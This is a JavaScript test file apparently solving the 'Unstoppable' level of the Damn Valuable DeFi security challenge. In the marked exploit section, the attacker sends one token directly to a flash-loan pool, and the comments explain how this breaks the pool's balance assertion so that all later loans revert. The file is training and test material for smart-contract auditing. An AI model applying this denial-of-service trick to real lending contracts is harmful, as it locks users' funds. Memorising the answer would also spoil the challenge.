const { ether, expectRevert } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');
// Just a ERC20
const DamnValuableToken = contract.fromArtifact('DamnValuableToken');

const UnstoppableLender = contract.fromArtifact('UnstoppableLender');
const ReceiverContract = contract.fromArtifact('ReceiverUnstoppable');

const { expect } = require('chai');

describe('[Challenge] Unstoppable', function() {
	const [ deployer, attacker, someUser, ...otherAccounts ] = accounts;

	// Pool has 1M * 10**18 tokens
	const TOKENS_IN_POOL = ether('1000000');
	const INITIAL_ATTACKER_BALANCE = ether('100');

	before(async function() {
		/** SETUP SCENARIO */
		//Create token
		this.token = await DamnValuableToken.new({ from: deployer });
		//Set up lender token address
		this.pool = await UnstoppableLender.new(this.token.address, { from: deployer });
		// Approve lender Pool to use deployer's token.
		await this.token.approve(this.pool.address, TOKENS_IN_POOL, { from: deployer });
		// increate lender pool token amount with trasnferfrom
		await this.pool.depositTokens(TOKENS_IN_POOL, { from: deployer });
		//Give Attacker initial balance.
		await this.token.transfer(attacker, INITIAL_ATTACKER_BALANCE, { from: deployer });
		//Check pool Lender pool is equal to initial variable.
		expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal(TOKENS_IN_POOL);
		// Check attacker balance is equal to initial variable.
		expect(await this.token.balanceOf(attacker)).to.be.bignumber.equal(INITIAL_ATTACKER_BALANCE);

		// Show it's possible for anyone to take out a flash loan
		//Create receiver contract and set lender pool address.
		this.receiverContract = await ReceiverContract.new(this.pool.address, { from: someUser });
		//Call Flashloan with 10 tokens.
		await this.receiverContract.executeFlashLoan(10, { from: someUser });
	});

	it('Exploit', async function() {
		/** YOUR EXPLOIT GOES HERE */
		//Transfering 1 token to the pool address from attacker.
		this.token.transfer(this.pool.address, 1, { from: attacker });
		//By transfer 1 or more token into the address pool. We render the whole lender contract useless.
		// As the contract checks for assert(poolBalance == balanceBefore);
		// poolBalance can only be updated but desposit. balanceBefore take from the current address token balance.
	});

	after(async function() {
		/** SUCCESS CONDITION */
		//expectRevert - Helpers for transaction failure (similar to chai’s throw): asserts that promise was rejected due to a reverted transaction.
		await expectRevert.unspecified(this.receiverContract.executeFlashLoan(10, { from: someUser }));
	});
});
